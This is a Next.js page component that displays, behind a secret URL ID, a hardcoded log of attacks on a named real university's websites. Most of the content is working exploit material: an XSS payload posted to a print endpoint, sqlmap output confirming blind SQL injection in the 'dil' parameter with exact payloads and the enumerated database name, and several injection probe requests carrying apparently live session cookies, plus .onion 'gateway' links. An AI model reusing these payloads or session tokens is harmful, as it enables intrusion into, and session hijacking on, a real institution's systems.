import { notFound } from "next/navigation";
import React from "react";

export default function VulnerableId({ params } : { params : { vulnerableId : any }}) {
    if (params.vulnerableId !== 'fb84629c294d0c69e066473baaa9e9c2fd66e91b') {
        return notFound();
    }

    const content = `
############################# https://ats.nisantasi.edu.tr #############################
POST /pages/anasayfa_yazdir.php HTTP/2
Host: ats.nisantasi.edu.tr
Content-Type: application/x-www-form-urlencoded
Referer: http://ats.nisantasi.edu.tr/login.php
Cookie: cf_clearance=286gmiM73crJ7D0WHMhukU7jPOOpqPEuzR6qEuAdiPI-1716460246-1.0.1.1-.OU2.TjqqsyTHjuPL0i89_JHrgF4z53wgXtKo_6Z.JnxUL2ugab0Q3dbrmLItIhO3GwZAdJjwnNkuAGM4y2Prg
Content-Length: 178
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip,deflate,br
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36

personel=<script>console.log(eval('2 + 2'));</script>&yazdir-adres=<img src="https://github.blog/wp-content/uploads/2020/12/102393310-07478b80-3f8d-11eb-84eb-392d555ebd29.png?fit=1200%2C630" width="100%" height="100%" />
############################# ats.nisantasi.edu.tr #############################

############################# nisantasi.edu.tr #############################
---
Parameter: dil (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: dil=-3389" OR 7591=7591#
    Gateway: http://2gzyxa5ihm7nsggfxnu52rck2vv4rvmdlkiu3zzui5du4xyclen53wid.onion/api/v2/gateway/06377f3dd94bde6d14a3519e2ae5690435d2eaea2

    Type: time-based blind
    Title: MySQL >= 5.0.12 OR time-based blind (SLEEP - comment)
    Payload: dil=0XOR(if(now()=sysdate(),sleep(6),0))XORZ" OR SLEEP(5)#
    Gateway: http://2gzyxa5ihm7nsggfxnu52rck2vv4rvmdlkiu3zzui5du4xyclen53wid.onion/api/v2/gateway/3519e2ae56906377f30435d2eaea2dd94bde6d14a
---
[14:44:26] [INFO] the back-end DBMS is MySQL
web application technology: PHP, PHP 7.4.32
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[14:44:26] [INFO] fetching database names
[14:44:26] [INFO] fetching number of databases
[14:45:14] [INFO] falling back to current database
[14:45:14] [INFO] fetching current database
[14:45:14] [INFO] resumed: nisanedutr_ndb
available databases [1]:
[*] nisanedutr_ndb

GET /arastirma/currentdr-ogretim-uyesi-mehmet-cicek-aippi-uluslararasi-markalar-daimi-komitesi-uyeligine-secildi-306811?dil=0"XOR(if(now()=sysdate()%2Csleep(6)%2C0))XOR"Z HTTP/1.1
X-Requested-With: XMLHttpRequest
Referer: https://www.nisantasi.edu.tr/
Cookie: PHPSESSID=ausjvhkhef2qtjjur5ohlbth49; cf_clearance=6rwbdgvrafPQ_wBprNCa8bwcTCLR65Y1J2Tdp5qubQg-1716467454-1.0.1.1-NNV6DOKk38QodOjXv84OfpoQZbzkQ0l.P9pbxLdlNHA8rKQJ6UNazDI8BF96BItYk1kQpTbZh.46sp5i7olaZg; roundcube_sessid=svagli9kgbpdaopbg1rqe36rf6
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip,deflate,br
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36
Host: www.nisantasi.edu.tr
Connection: Keep-alive

GET /arastirma/assoc-prof-dr-orhan-dragas-article-has-been-published-180242?dil=0"XOR(if(now()=sysdate()%2Csleep(6)%2C0))XOR"Z HTTP/1.1
X-Requested-With: XMLHttpRequest
Referer: https://www.nisantasi.edu.tr/
Cookie: PHPSESSID=ausjvhkhef2qtjjur5ohlbth49
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip,deflate,br
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36
Host: www.nisantasi.edu.tr
Connection: Keep-alive

GET /?dil=0"XOR(if(now()=sysdate()%2Csleep(6)%2C0))XOR"Z HTTP/2
Host: www.nisantasi.edu.tr
X-Requested-With: XMLHttpRequest
Referer: https://www.nisantasi.edu.tr/
Cookie: PHPSESSID=ausjvhkhef2qtjjur5ohlbth49; cf_clearance=F1dpqsnpo9YzaW0IBSZYcIrZ23Z5y2aiDGx0LtKneUE-1716463223-1.0.1.1-0xYaLog08yJcbnzX.86MgOxwppWMfpMw8lfCt83vyJBKDQjX6ianjYgBgj.wE4MM7PA4pZWI6ePa_g75XkG3vA
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip,deflate,br
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36

GET /sayfa/1'" HTTP/1.1
Referer: https://www.nisantasi.edu.tr/
Cookie: PHPSESSID=ausjvhkhef2qtjjur5ohlbth49; cf_clearance=MKPtyXgotPCeswYkjU.iWzKrNqM1dMlehO1IEg84b40-1716465447-1.0.1.1-MqHrn8InSS2W_rU3YxqOYr0qD7eDly1K.N93t_KnVCmveHUSomUj85w6L.Ez.fm.cSPiRi3dN4v5wMdZp2lclQ; roundcube_sessid=svagli9kgbpdaopbg1rqe36rf6
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip,deflate,br
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36
Host: www.nisantasi.edu.tr
Connection: Keep-alive

GET /arastirma/0"XOR(if(now()=sysdate(),sleep(6),0))XOR"Z-180242 HTTP/1.1
X-Requested-With: XMLHttpRequest
Referer: https://www.nisantasi.edu.tr/
Cookie: PHPSESSID=ausjvhkhef2qtjjur5ohlbth49; cf_clearance=MKPtyXgotPCeswYkjU.iWzKrNqM1dMlehO1IEg84b40-1716465447-1.0.1.1-MqHrn8InSS2W_rU3YxqOYr0qD7eDly1K.N93t_KnVCmveHUSomUj85w6L.Ez.fm.cSPiRi3dN4v5wMdZp2lclQ; roundcube_sessid=svagli9kgbpdaopbg1rqe36rf6
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip,deflate,br
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36
Host: www.nisantasi.edu.tr
Connection: Keep-alive

GET /arastirma/assoc-prof-dr-orhan-dragas-article-has-been-published-1'" HTTP/1.1
Referer: https://www.nisantasi.edu.tr/
Cookie: PHPSESSID=ausjvhkhef2qtjjur5ohlbth49; cf_clearance=MKPtyXgotPCeswYkjU.iWzKrNqM1dMlehO1IEg84b40-1716465447-1.0.1.1-MqHrn8InSS2W_rU3YxqOYr0qD7eDly1K.N93t_KnVCmveHUSomUj85w6L.Ez.fm.cSPiRi3dN4v5wMdZp2lclQ; roundcube_sessid=svagli9kgbpdaopbg1rqe36rf6
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip,deflate,br
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36
Host: www.nisantasi.edu.tr
Connection: Keep-alive

GET /duyuru/-1'" HTTP/1.1
Referer: https://www.nisantasi.edu.tr/
Cookie: PHPSESSID=ausjvhkhef2qtjjur5ohlbth49; cf_clearance=6rwbdgvrafPQ_wBprNCa8bwcTCLR65Y1J2Tdp5qubQg-1716467454-1.0.1.1-NNV6DOKk38QodOjXv84OfpoQZbzkQ0l.P9pbxLdlNHA8rKQJ6UNazDI8BF96BItYk1kQpTbZh.46sp5i7olaZg; roundcube_sessid=svagli9kgbpdaopbg1rqe36rf6
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip,deflate,br
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36
Host: www.nisantasi.edu.tr
Connection: Keep-alive

GET /akademik-takvim"1<ScRiPt>PtdS(9726)</ScRiPt> HTTP/2
Host: www.nisantasi.edu.tr
Referer: https://www.nisantasi.edu.tr/
Cookie: PHPSESSID=ausjvhkhef2qtjjur5ohlbth49; cf_clearance=F1dpqsnpo9YzaW0IBSZYcIrZ23Z5y2aiDGx0LtKneUE-1716463223-1.0.1.1-0xYaLog08yJcbnzX.86MgOxwppWMfpMw8lfCt83vyJBKDQjX6ianjYgBgj.wE4MM7PA4pZWI6ePa_g75XkG3vA
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip,deflate,br
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36
############################# nisantasi.edu.tr #############################`;

    const sections = content.split('#############################');

    // Fonksiyon: özel karakterleri kaçırmak için
    const escapeHtml = (unsafe : any) => {
        return unsafe
            .replace(/&/g, "&amp;")
            .replace(/</g, "&lt;")
            .replace(/>/g, "&gt;")
            .replace(/"/g, "&quot;")
            .replace(/'/g, "&#039;");
    }

    // İçeriği işleme ve düzenleme fonksiyonu
    const processSection = (section : any) => {
        if (section.includes('https://ats.nisantasi.edu.tr')) {
            // Resim URL'si
            const imageUrl = '/uploads/1554486.png';  // Gerçek resim URL'siyle değiştirin

            // Resmi ekleyin
            return `
                ${escapeHtml(section.trim())}
                <img src="${imageUrl}" alt="Nisantasi Image" style="display: block; margin: 10px 0; height:auto; width:70rem;">
            `;
        }

        return escapeHtml(section.trim());
    };

    return (
        <div className="max-w-[85rem] px-4 py-10 sm:px-6 lg:px-8 lg:py-14 mx-auto mt-20">
            <div className="flex flex-col ">
                <div className="-m-1.5 overflow-x-auto">
                    <div className="p-1.5 min-w-full inline-block align-middle">
                        <div className="bg-black border border-gray-700 rounded-xl shadow-sm overflow-hidden">
                            <div className="px-6 py-4 border-b border-slate-500/30 text-white">
                                <h2 className="text-xl font-semibold">Terminal</h2>
                                <p className="text-sm">Log kayıtları: {params.vulnerableId}</p>
                            </div>
                            <div>
                                <div className="w-full min-h-auto px-6 py-4 bg-black">
                                    <div className="text-white text-xs max-w-[77rem]">
                                    {sections.map((section, index) => (
                                        <div className="whitespace-nowrap" key={index} style={{ marginBottom: '20px', border: '1px solid #ccc', padding: '10px' }}>
                                            <pre className="whitespace-pre-wrap	" dangerouslySetInnerHTML={{ __html: processSection(section) }}></pre>
                                        </div>
                                    ))}
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>);
}